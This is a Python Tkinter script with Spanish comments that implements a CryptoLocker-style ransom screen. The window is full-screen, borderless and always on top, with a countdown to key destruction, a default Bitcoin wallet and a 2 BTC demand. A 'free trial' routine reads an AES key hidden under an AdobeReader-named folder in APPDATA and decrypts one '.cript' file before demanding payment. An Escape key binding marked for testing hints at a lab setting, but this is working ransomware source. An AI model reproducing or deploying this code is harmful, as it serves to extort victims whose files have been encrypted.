"""
Interfaz de Aviso (Nota de Rescate) - Versión Tkinter
Compatible con Windows 7, 8, 10, 11
No requiere PyQt6/PyQt5 - Solo usa tkinter (incluido en Python)
"""
import tkinter as tk
from tkinter import ttk, filedialog, messagebox
import sys
import os
import argparse
from datetime import datetime, timedelta

# Configuración por argumentos de línea de comandos
def parse_args():
    parser = argparse.ArgumentParser(description='Ventana de aviso CryptoLocker')
    parser.add_argument('--wallet', type=str, default='1KP72fBmh3XBRfuJDMn53APaqM6iMRspCh', 
                        help='Dirección de wallet Bitcoin')
    parser.add_argument('--amount', type=str, default='2', 
                        help='Cantidad de BTC a pagar')
    parser.add_argument('--hours', type=int, default=71, 
                        help='Horas del temporizador')
    parser.add_argument('--minutes', type=int, default=57, 
                        help='Minutos del temporizador')
    parser.add_argument('--seconds', type=int, default=22, 
                        help='Segundos del temporizador')
    parser.add_argument('--files', type=int, default=0, 
                        help='Número de archivos cifrados')
    parser.add_argument('--title', type=str, default='CryptoLocker', 
                        help='Título de la ventana')
    return parser.parse_args()

class VentanaCryptoLocker:
    def __init__(self, root, config):
        self.root = root
        self.config = config
        self.total_seconds = (config['hours'] * 3600) + (config['minutes'] * 60) + config['seconds']
        self.script_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
        
        # Configurar ventana
        self.root.title(config['title'])
        self.root.configure(bg='#8B0000')
        
        # Pantalla completa y siempre al frente
        self.root.attributes('-fullscreen', True)
        self.root.attributes('-topmost', True)
        self.root.overrideredirect(True)  # Sin bordes
        
        # Bind para cerrar con Escape (para pruebas)
        self.root.bind('<Escape>', lambda e: self.root.destroy())
        
        self.crear_interfaz()
        self.actualizar_timer()
    
    def crear_interfaz(self):
        # Frame principal
        main_frame = tk.Frame(self.root, bg='#8B0000')
        main_frame.pack(expand=True, fill='both', padx=50, pady=30)
        
        # === TÍTULO ===
        titulo = tk.Label(main_frame, text="Pago por clave privada", 
                         font=('Arial', 28, 'bold'), fg='white', bg='#8B0000')
        titulo.pack(pady=(0, 20))
        
        # === CONTENEDOR PRINCIPAL (izquierda + derecha) ===
        content_frame = tk.Frame(main_frame, bg='#8B0000')
        content_frame.pack(expand=True, fill='both')
        
        # --- PANEL IZQUIERDO ---
        left_panel = tk.Frame(content_frame, bg='#8B0000', width=350)
        left_panel.pack(side='left', padx=(0, 40), fill='y')
        left_panel.pack_propagate(False)
        
        # Escudo (imagen o placeholder)
        escudo_path = os.path.join(self.script_dir, 'escudo.png')
        if os.path.exists(escudo_path):
            try:
                from PIL import Image, ImageTk
                img = Image.open(escudo_path)
                img = img.resize((200, 200), Image.Resampling.LANCZOS)
                self.escudo_img = ImageTk.PhotoImage(img)
                escudo_label = tk.Label(left_panel, image=self.escudo_img, bg='#8B0000')
                escudo_label.pack(pady=20)
            except ImportError:
                # Sin PIL, mostrar placeholder
                escudo_label = tk.Label(left_panel, text="🛡️", font=('Arial', 80), fg='#2563EB', bg='#8B0000')
                escudo_label.pack(pady=20)
        else:
            escudo_label = tk.Label(left_panel, text="🛡️", font=('Segoe UI Emoji', 80), fg='#2563EB', bg='#8B0000')
            escudo_label.pack(pady=20)
        
        # Texto de destrucción
        destruccion_date = datetime.now() + timedelta(seconds=self.total_seconds)
        tk.Label(left_panel, text="Su clave privada será destruida el",
                font=('Arial', 14), fg='white', bg='#8B0000').pack()
        tk.Label(left_panel, text=destruccion_date.strftime("%m/%d/%Y\n%I:%M %p"),
                font=('Arial', 16, 'bold'), fg='white', bg='#8B0000').pack(pady=10)
        
        # Tiempo restante
        tk.Label(left_panel, text="Tiempo restante",
                font=('Arial', 16), fg='white', bg='#8B0000').pack(pady=(30, 10))
        
        # Timer frame
        timer_frame = tk.Frame(left_panel, bg='#000000', padx=20, pady=10)
        timer_frame.pack()
        
        self.timer_label = tk.Label(timer_frame, text="00 : 00 : 00",
                                   font=('Arial', 36, 'bold'), fg='#FFD700', bg='#000000')
        self.timer_label.pack()
        
        # --- PANEL DERECHO ---
        right_panel = tk.Frame(content_frame, bg='white', padx=30, pady=30)
        right_panel.pack(side='right', expand=True, fill='both')
        
        # Método de pago
        tk.Label(right_panel, text="Elija un método de pago conveniente:",
                font=('Arial', 12, 'bold'), fg='#333', bg='white', anchor='w').pack(fill='x')
        
        metodo_combo = ttk.Combobox(right_panel, values=[
            "Bitcoin (opción más barata)", "MoneyPak", "Ukash", "Paysafecard", "cashU"
        ], state='readonly', font=('Arial', 12))
        metodo_combo.current(0)
        metodo_combo.pack(fill='x', pady=(5, 20))
        
        # Bitcoin logo
        btc_frame = tk.Frame(right_panel, bg='white')
        btc_frame.pack(pady=10)
        tk.Label(btc_frame, text="₿", font=('Arial', 28, 'bold'), 
                fg='white', bg='#F7931A', padx=10).pack(side='left')
        tk.Label(btc_frame, text="bitcoin", font=('Arial', 28, 'bold italic'),
                fg='#444', bg='white').pack(side='left', padx=10)
        
        # Descripción
        desc = ("Bitcoin es una criptomoneda donde la creación y transferencia de bitcoins "
                "se basa en un protocolo criptográfico de código abierto que es independiente "
                "de cualquier autoridad central.")
        tk.Label(right_panel, text=desc, font=('Arial', 11), fg='#333', bg='white',
                wraplength=500, justify='left').pack(fill='x', pady=15)
        
        # Instrucciones
        tk.Label(right_panel, text="Debe enviar la cantidad especificada a continuación a la dirección Bitcoin:",
                font=('Arial', 12, 'bold'), fg='#333', bg='white', anchor='w').pack(fill='x')
        
        wallet_frame = tk.Frame(right_panel, bg='#F0F0F0', bd=1, relief='solid')
        wallet_frame.pack(fill='x', pady=5)
        wallet_entry = tk.Entry(wallet_frame, font=('Courier New', 12, 'bold'), 
                               fg='black', bg='#F0F0F0', bd=0, state='readonly')
        wallet_entry.insert(0, self.config['wallet'])
        wallet_entry.pack(padx=10, pady=8, fill='x')
        
        tk.Label(right_panel, text="y especificar el ID de transacción, que será verificado y confirmado.",
                font=('Arial', 12, 'bold'), fg='#333', bg='white', anchor='w').pack(fill='x', pady=(0, 20))
        
        # Input transacción
        tk.Label(right_panel, text="Ingrese ID de transacción y presione «Pagar»:",
                font=('Arial', 12, 'bold'), fg='#333', bg='white', anchor='w').pack(fill='x')
        
        input_frame = tk.Frame(right_panel, bg='white')
        input_frame.pack(fill='x', pady=5)
        
        self.trans_entry = tk.Entry(input_frame, font=('Arial', 12))
        self.trans_entry.pack(side='left', expand=True, fill='x', padx=(0, 10))
        
        amount_combo = ttk.Combobox(input_frame, values=[f"{self.config['amount']}      BTC"], 
                                   state='readonly', width=15, font=('Arial', 12))
        amount_combo.current(0)
        amount_combo.pack(side='right')
        
        # === SECCIÓN DESCIFRAR GRATIS ===
        used_flag = os.path.join(self.script_dir, '.decrypt_used')
        
        if not os.path.exists(used_flag):
            decrypt_frame = tk.Frame(main_frame, bg='#8B0000')
            decrypt_frame.pack(fill='x', pady=20)
            
            tk.Label(decrypt_frame, text="Descifrar UN archivo GRATIS (prueba):",
                    font=('Arial', 14, 'bold'), fg='#FFD700', bg='#8B0000').pack(side='left', padx=10)
            
            self.decrypt_entry = tk.Entry(decrypt_frame, font=('Arial', 12), width=50)
            self.decrypt_entry.pack(side='left', padx=5)
            
            tk.Button(decrypt_frame, text="Explorar", font=('Arial', 12, 'bold'),
                     command=self.browse_file, bg='#4a90e2', fg='white').pack(side='left', padx=5)
            
            tk.Button(decrypt_frame, text="Descifrar", font=('Arial', 12, 'bold'),
                     command=self.decrypt_one_file, bg='#00a152', fg='white').pack(side='left', padx=5)
        
        # === BOTONES FOOTER ===
        button_frame = tk.Frame(main_frame, bg='#8B0000')
        button_frame.pack(pady=20)
        
        tk.Button(button_frame, text="<< Volver", font=('Arial', 14, 'bold'),
                 command=self.root.destroy, bg='#4a90e2', fg='white', padx=30, pady=10).pack(side='left', padx=20)
        
        tk.Button(button_frame, text="PAGAR", font=('Arial', 14, 'bold'),
                 command=self.verificar_pago, bg='#4a90e2', fg='white', padx=30, pady=10).pack(side='left', padx=20)
    
    def actualizar_timer(self):
        if self.total_seconds > 0:
            hours = self.total_seconds // 3600
            minutes = (self.total_seconds % 3600) // 60
            seconds = self.total_seconds % 60
            self.timer_label.config(text=f"{hours:02d} : {minutes:02d} : {seconds:02d}")
            self.total_seconds -= 1
            self.root.after(1000, self.actualizar_timer)
        else:
            self.timer_label.config(text="00 : 00 : 00", fg='red')
    
    def browse_file(self):
        used_flag = os.path.join(self.script_dir, '.decrypt_used')
        if os.path.exists(used_flag):
            messagebox.showwarning("Límite Alcanzado", 
                "Ya has utilizado tu descifrado GRATUITO.\n\nPara descifrar más archivos, debes PAGAR el rescate.")
            return
        
        file_path = filedialog.askopenfilename(
            title="Seleccionar archivo cifrado",
            filetypes=[("Archivos Cifrados", "*.cript"), ("Todos los archivos", "*.*")]
        )
        if file_path:
            self.decrypt_entry.delete(0, tk.END)
            self.decrypt_entry.insert(0, file_path)
    
    def decrypt_one_file(self):
        used_flag = os.path.join(self.script_dir, '.decrypt_used')
        
        if os.path.exists(used_flag):
            messagebox.showwarning("Límite Alcanzado", 
                "Ya has utilizado tu descifrado GRATUITO.\n\nPara descifrar más archivos, debes PAGAR el rescate.")
            return
        
        if not hasattr(self, 'decrypt_entry'):
            return
            
        file_path = self.decrypt_entry.get().strip()
        if not file_path:
            messagebox.showwarning("Error", "Por favor seleccione un archivo primero.")
            return
        
        if not os.path.exists(file_path):
            messagebox.showwarning("Error", f"Archivo no encontrado: {file_path}")
            return
        
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
            from cryptography.hazmat.backends import default_backend
            
            # Leer clave - buscar en múltiples ubicaciones
            key = None
            key_locations = [
                os.path.join(os.environ.get('APPDATA', ''), 'AdobeReader', '.aes_key'),
                os.path.join(self.script_dir, '.aes_key'),
                os.path.join(os.getcwd(), '.aes_key')
            ]
            
            for key_file in key_locations:
                if os.path.exists(key_file):
                    try:
                        with open(key_file, 'r') as f:
                            key = bytes.fromhex(f.read().strip())
                        break
                    except:
                        continue
            
            if not key:
                messagebox.showerror("Error", "Clave de descifrado no encontrada. Contacte al administrador.")
                return
            
            with open(file_path, 'rb') as f:
                data = f.read()
            
            iv = data[:16]
            encrypted_data = data[16:]
            
            cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
            decryptor = cipher.decryptor()
            decrypted = decryptor.update(encrypted_data) + decryptor.finalize()
            
            # Quitar padding
            pad_len = decrypted[-1]
            decrypted = decrypted[:-pad_len]
            
            # Guardar archivo original
            original_path = file_path[:-6]  # Quitar .cript
            with open(original_path, 'wb') as f:
                f.write(decrypted)
            
            os.remove(file_path)
            
            # Marcar como usado
            with open(used_flag, 'w') as f:
                f.write(f"Usado en: {file_path}\n")
            
            messagebox.showinfo("Éxito", 
                f"¡Archivo descifrado exitosamente!\n\n"
                f"Restaurado: {original_path}\n\n"
                f"⚠️ Este fue tu ÚNICO descifrado GRATIS.\n"
                f"Para descifrar más archivos, debes PAGAR.")
            
        except Exception as e:
            messagebox.showerror("Error", f"Fallo al descifrar: {str(e)}")
    
    def verificar_pago(self):
        trans_id = self.trans_entry.get().strip()
        if not trans_id:
            messagebox.showwarning("Error", "Por favor ingrese el ID de transacción.")
            return
        messagebox.showinfo("Verificando", 
            f"Verificando transacción: {trans_id}\n\nEste proceso puede tomar varios minutos...")


if __name__ == '__main__':
    args = parse_args()
    
    config = {
        'wallet': args.wallet,
        'amount': args.amount,
        'hours': args.hours,
        'minutes': args.minutes,
        'seconds': args.seconds,
        'files': args.files,
        'title': args.title
    }
    
    root = tk.Tk()
    app = VentanaCryptoLocker(root, config)
    root.mainloop()
